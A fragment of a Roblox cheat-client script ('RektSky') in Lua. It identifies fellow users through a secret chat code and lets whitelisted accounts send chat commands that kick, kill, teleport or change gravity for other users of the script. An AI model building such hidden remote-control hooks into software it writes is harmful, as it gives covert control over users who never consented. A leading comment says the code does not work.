-- code no work lmao]]

local whitelists = {
    ["IsPrivUserInGame"] = function()
        for i, v in pairs(game.Players:GetPlayers()) do
            for k, b in pairs(whiteliststhing) do
                if v.UserId == tonumber(b) then
                    return true
                end
            end
        end
        return false
    end,
    ["GetPrivUser"] = function()
        for i, v in pairs(game.Players:GetPlayers()) do
            for k, b in pairs(whiteliststhing) do
                if v.UserId == tonumber(b) then
                    return v.Name
                end
            end
        end
    end
}

local alreadytold = {}

repeat
    if lplr.Name == whitelists["GetPrivUser"]() then break end
    task.wait(1)
    if whitelists["IsPrivUserInGame"]() then
        if not table.find(alreadytold, whitelists["GetPrivUser"]()) then
            table.insert(alreadytold, whitelists["GetPrivUser"]())
            args = {
                [1] = "/whipser " .. whitelists["GetPrivUser"](),
                [2] = "All"
            }
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
            task.wait(0.5)
            args = {
                [1] = "RQYBPTYNURYZC",
                [2] = "All"
            }
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
        end
    end    
until (true == false)

for i, v in pairs(game.Players:GetPlayers()) do
    if lplr.Name == whitelists["GetPrivUser"]() then 
        v.Chatted:connect(function(msg)
            if msg == "RQYBPTYNURYZC" then
                createnotification("RektSky", v.Name .. " is using rektsky!", 60, true)
            end
        end)
    else
        for lol, xd in pairs(whiteliststhing) do
            if v.UserId == tonumber(xd) then
                v.Chatted:connect(function(msg)
                    if msg:find("r!kick") then
                        if msg:find(lplr.Name) then
                            local args = msg:gsub("r!kick " .. lplr.Name, "")
                            lplr:kick(args)
                        end
                    end
                    if msg:find("r!kill") then
                        if msg:find(lplr.Name) then
                            lplr.Character.Humanoid:TakeDamage(lplr.Character.Humanoid.Health)
                        end
                    end
                    if msg:find("r!lagback") then
                        if msg:find(lplr.Name) then
                            lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 10000, 0)
                        end
                    end
                    if msg:find("r!gravity") then
                        if msg:find(lplr.Name) then
                            local args = msg:gsub("r!gravity " .. lplr.Name, "")
                            game.Workspace.Gravity = tonumber(args)
                        end
                    end
                end)
            end
        end
    end
end
